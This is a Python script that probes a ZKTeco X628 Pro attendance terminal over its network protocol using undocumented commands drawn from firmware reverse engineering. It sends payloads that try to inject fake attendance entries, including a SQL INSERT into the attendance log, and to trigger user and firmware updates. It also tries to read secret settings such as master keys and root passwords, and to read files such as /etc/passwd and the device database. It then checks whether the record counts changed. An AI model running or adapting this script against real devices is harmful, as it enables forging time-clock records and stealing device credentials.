# -*- coding: utf-8 -*-
"""
ZK X628 PRO - RE-DISCOVERED COMMANDS TEST
Test các commands từ zhangyoufu RE FW 6.60 mà chưa test kỹ:
- CMD_UPDATE_USERS (0x34) - update users from buffer
- CMD_TEMPDB_ADD (0x31) - add to temp DB
- CMD_BIGDATA_INFO (0x2746) + CMD_BIG_DATA (0x2747) + CMD_BIGDATA_WRQ (0x2748)
- CMD_OPTIONS_DECIPHERING (0x6AE) - decode options
- CMD_RTLOG_RRQ (0x5A) - read real-time log
- CMD_UPDATE_FIREWARE (0x6E) - update firmware
- CMD_OPTIONS_RRQ_EXTEND (0x1F5) - options RRQ extend
- CMD_HASH_DATA (0x77) - hash data
- CMD_READ_DATA (0x5E0) - read data
- CMD_UPDATEFILE (0x6A4) - update file
- CMD_READFILE (0x6A6) - read file
- CMD_MTHRESHOLD (0x76) - MThreshold
- CMD_CHECKUDISKUPDATEPACKPAGE (0x6AD)
- CMD_USER_INFO (0x75)
- CMD_APPEND_USER (0x10)
- CMD_APPEND_USERTEMP (0x11)
- CMD_APPEND_INFO (0x74)
"""
import sys, os, struct, time
sys.stdout.reconfigure(encoding='utf-8')

PORTABLE_PY = r'D:\chamcong\AttendanceSuite_Portable\python\Lib\site-packages'
sys.path.insert(0, PORTABLE_PY)

import zk
from zk import const

DEVICE_IP = '172.16.0.214'

print('=' * 70)
print(f'ZK X628 PRO - RE-DISCOVERED COMMANDS TEST')
print('=' * 70)

z = zk.ZK(DEVICE_IP, port=4370, timeout=10, password=0)
z.connect()
print(f'Connected: FW={z.get_firmware_version()}, Serial={z.get_serialnumber()}')

# Baseline
z.read_sizes()
baseline_records = z.records
baseline_users = z.users
print(f'Baseline: records={baseline_records}, users={baseline_users}')

# === Test 1: CMD_TEMPDB_ADD (0x31) với proper ATTLOG-like payloads ===
print('\n[1] CMD_TEMPDB_ADD (0x31) - add to temp DB...')
tempdb_payloads = [
    # Format 1: Simple ID|Time|Status
    b'1234\t2026-09-14 19:00:00\t1\t15\t0\t0\t0\t0\t0',
    # Format 2: Just PIN + Time
    b'1234\t2026-09-14 19:00:00',
    # Format 3: Tab-separated full ATTLOG (10 cols)
    b'1234\t2026-09-14 19:00:00\t1\t15\t0\t0\t0\t0\t0\t0',
    # Format 4: 8-byte binary record (uid H + status B + ts 4s + punch B)
    struct.pack('<HB4sB', 1234, 1, struct.pack('<I', 11445000), 15),
    # Format 5: 16-byte binary
    struct.pack('<IIBBHI', 1234, 11445000, 1, 15, 0, 0),
    # Format 6: 40-byte binary
    struct.pack('<H24sB4sB8s', 1234, b'PIN1234\x00' + b'\x00'*16, 1, struct.pack('<I', 11445000), 15, b'\x00'*8),
    # Format 7: SQL INSERT
    b"INSERT INTO ATT_LOG VALUES(NULL, '1234', '2026-09-14 19:00:00', 1, 15, 0, '', '', '', 0)",
    # Format 8: CSV row
    b'1234,2026-09-14 19:00:00,1,15,0,0,0,0,0,0',
    # Format 9: With size prefix
    struct.pack('I', 10) + b'1234\t2026-09-14 19:00:00',
    # Format 10: 4-byte size + 8-byte record
    struct.pack('I', 8) + struct.pack('<HB4sB', 1234, 1, struct.pack('<I', 11445000), 15),
    # Format 11: with fct=1 prefix (like CMD_QUERY_DATA)
    struct.pack('<bhii', 1, 0x0D, 1, 0) + struct.pack('<HB4sB', 1234, 1, struct.pack('<I', 11445000), 15),
    # Format 12: with fct=ATTLOG=1 + ext
    struct.pack('<II', 1, 0) + struct.pack('<HB4sB', 1234, 1, struct.pack('<I', 11445000), 15),
]

for i, payload in enumerate(tempdb_payloads, 1):
    try:
        resp = z._ZK__send_command(0x31, payload)
        code = resp.get('code') if isinstance(resp, dict) else resp
        data = z._ZK__data
        data_info = f' data={data[:50].hex()!r}' if data else ''
        print(f'  [{i}] payload={payload[:40]!r}: code={code}{data_info}')
    except Exception as e:
        err = str(e)[:40]
        print(f'  [{i}] payload={payload[:40]!r}: {err}')

# === Test 2: CMD_UPDATE_USERS (0x34) ===
print('\n[2] CMD_UPDATE_USERS (0x34) - update users...')
for payload in [b'', b'1', b'\x01\x00\x00\x00', b'UPDATE_ALL', b'ALL']:
    try:
        resp = z._ZK__send_command(0x34, payload)
        code = resp.get('code') if isinstance(resp, dict) else resp
        data = z._ZK__data
        data_info = f' data={data[:50]!r}' if data else ''
        print(f'  payload={payload!r}: code={code}{data_info}')
    except Exception as e:
        print(f'  payload={payload!r}: {str(e)[:40]}')

# === Test 3: CMD_UPDATE_TEMP (0x35) ===
print('\n[3] CMD_UPDATE_TEMP (0x35) - update templates...')
for payload in [b'', b'1', b'\x01\x00\x00\x00', b'UPDATE_ALL']:
    try:
        resp = z._ZK__send_command(0x35, payload)
        code = resp.get('code') if isinstance(resp, dict) else resp
        print(f'  payload={payload!r}: code={code}')
    except Exception as e:
        print(f'  payload={payload!r}: {str(e)[:40]}')

# === Test 4: CMD_BIGDATA_INFO (0x2746) ===
print('\n[4] CMD_BIGDATA_INFO (0x2746) - get big data info...')
for payload in [b'', b'1', b'0', b'\x01\x00\x00\x00']:
    try:
        resp = z._ZK__send_command(0x2746, payload, response_size=256)
        code = resp.get('code') if isinstance(resp, dict) else resp
        data = z._ZK__data
        if data:
            print(f'  payload={payload!r}: code={code}, data={data[:80].hex()}')
        else:
            print(f'  payload={payload!r}: code={code}')
    except Exception as e:
        print(f'  payload={payload!r}: {str(e)[:50]}')

# === Test 5: CMD_BIG_DATA (0x2747) - read big data ===
print('\n[5] CMD_BIG_DATA (0x2747) - read big data...')
for payload in [b'', b'\x01\x00\x00\x00', b'\x00\x00\x00\x00', b'1', b'0']:
    try:
        resp = z._ZK__send_command(0x2747, payload, response_size=1024)
        code = resp.get('code') if isinstance(resp, dict) else resp
        data = z._ZK__data
        if data and len(data) > 4:
            total = struct.unpack('<I', data[:4])[0]
            print(f'  payload={payload!r}: code={code}, total_bytes={total}, data[:64]={data[:64].hex()}')
        else:
            print(f'  payload={payload!r}: code={code}')
    except Exception as e:
        print(f'  payload={payload!r}: {str(e)[:50]}')

# === Test 6: CMD_OPTIONS_DECIPHERING (0x6AE) - decode options ===
print('\n[6] CMD_OPTIONS_DECIPHERING (0x6AE) - decode options...')
for payload in [b'', b'decode', b'AllOptions', b'*', b'\xff'*16]:
    try:
        resp = z._ZK__send_command(0x6AE, payload, response_size=1024)
        code = resp.get('code') if isinstance(resp, dict) else resp
        data = z._ZK__data
        if data and len(data) > 10:
            print(f'  payload={payload!r}: code={code}, data[:200]={data[:200]!r}')
        else:
            print(f'  payload={payload!r}: code={code}')
    except Exception as e:
        print(f'  payload={payload!r}: {str(e)[:50]}')

# === Test 7: CMD_RTLOG_RRQ (0x5A) - real-time log ===
print('\n[7] CMD_RTLOG_RRQ (0x5A) - read real-time log...')
try:
    resp = z._ZK__send_command(0x5A, b'', response_size=4096)
    code = resp.get('code') if isinstance(resp, dict) else resp
    data = z._ZK__data
    if data:
        print(f'  code={code}, data_len={len(data)}, data[:100]={data[:100].hex()}')
    else:
        print(f'  code={code}')
except Exception as e:
    print(f'  {str(e)[:50]}')

# === Test 8: CMD_UPDATE_FIREWARE (0x6E) - firmware update ===
print('\n[8] CMD_UPDATE_FIREWARE (0x6E) - firmware update trigger...')
for payload in [b'', b'USB', b'UDisk', b'FW_UPDATE', b'\x01\x00\x00\x00']:
    try:
        resp = z._ZK__send_command(0x6E, payload)
        code = resp.get('code') if isinstance(resp, dict) else resp
        print(f'  payload={payload!r}: code={code}')
    except Exception as e:
        print(f'  payload={payload!r}: {str(e)[:50]}')

# === Test 9: CMD_OPTIONS_RRQ_EXTEND (0x1F5) ===
print('\n[9] CMD_OPTIONS_RRQ_EXTEND (0x1F5) - extended options read...')
for opt in ['DeviceName', 'SerialNumber', 'FirmwareVersion', 'Platform', 'MAC', 'IPAddress',
            'CommPassword', '~DeviceKey', '~MasterKey', '~EncryptionKey', 'CommKey',
            'DeviceID', 'ServiceMode', 'VendorMode', 'EngineeringMode', 'DebugMode',
            'TestMode', '~ServiceKey', 'RootPassword', 'AdminKey']:
    try:
        resp = z._ZK__send_command(0x1F5, opt.encode())
        code = resp.get('code') if isinstance(resp, dict) else resp
        data = z._ZK__data
        if data:
            print(f'  {opt}: code={code}, data={data[:60]!r}')
    except Exception as e:
        err = str(e)[:30]
        if 'tcp' not in err.lower():
            print(f'  {opt}: {err}')

# === Test 10: CMD_HASH_DATA (0x77) ===
print('\n[10] CMD_HASH_DATA (0x77) - hash data...')
for payload in [b'test', b'\x00'*16, b'1234567890123456', b'ServiceKey']:
    try:
        resp = z._ZK__send_command(0x77, payload)
        code = resp.get('code') if isinstance(resp, dict) else resp
        data = z._ZK__data
        if data:
            print(f'  payload={payload!r}: code={code}, hash={data[:32].hex()}')
        else:
            print(f'  payload={payload!r}: code={code}')
    except Exception as e:
        print(f'  payload={payload!r}: {str(e)[:50]}')

# === Test 11: CMD_READ_DATA (0x5E0) ===
print('\n[11] CMD_READ_DATA (0x5E0) - read data...')
for payload in [b'', b'\x01\x00\x00\x00', b'\xff'*8, b'ALL']:
    try:
        resp = z._ZK__send_command(0x5E0, payload, response_size=1024)
        code = resp.get('code') if isinstance(resp, dict) else resp
        data = z._ZK__data
        if data and len(data) > 4:
            print(f'  payload={payload!r}: code={code}, data_len={len(data)}, data[:50]={data[:50].hex()}')
        else:
            print(f'  payload={payload!r}: code={code}, data_len={len(data) if data else 0}')
    except Exception as e:
        print(f'  payload={payload!r}: {str(e)[:50]}')

# === Test 12: CMD_UPDATEFILE (0x6A4) - update file via protocol? ===
print('\n[12] CMD_UPDATEFILE (0x6A4) - update file...')
for payload in [b'', b'update', b'/tmp/test']:
    try:
        resp = z._ZK__send_command(0x6A4, payload)
        code = resp.get('code') if isinstance(resp, dict) else resp
        print(f'  payload={payload!r}: code={code}')
    except Exception as e:
        print(f'  payload={payload!r}: {str(e)[:50]}')

# === Test 13: CMD_READFILE (0x6A6) - read file via protocol? ===
print('\n[13] CMD_READFILE (0x6A6) - read file...')
for filename in [b'', b'/etc/passwd', b'data/ZKDB.db', b'/tmp/ZKDB.db', b'/mnt/mtdblock/data/ZKDB.db',
                 b'/data/', b'config.ini', b'data.dat']:
    try:
        resp = z._ZK__send_command(0x6A6, filename, response_size=4096)
        code = resp.get('code') if isinstance(resp, dict) else resp
        data = z._ZK__data
        if data:
            print(f'  filename={filename!r}: code={code}, data[:100]={data[:100].hex()}')
    except Exception as e:
        pass

# === Test 14: Final check - counts unchanged? ===
print('\n[14] Final state check...')
try:
    z.read_sizes()
    print(f'  Final: records={z.records}, users={z.users}')
    if z.records != baseline_records:
        print(f'  🔥 RECORDS CHANGED: {baseline_records} → {z.records}')
    if z.users != baseline_users:
        print(f'  🔥 USERS CHANGED: {baseline_users} → {z.users}')
except Exception as e:
    print(f'  ERROR: {e}')

z.disconnect()
print('\nDONE')
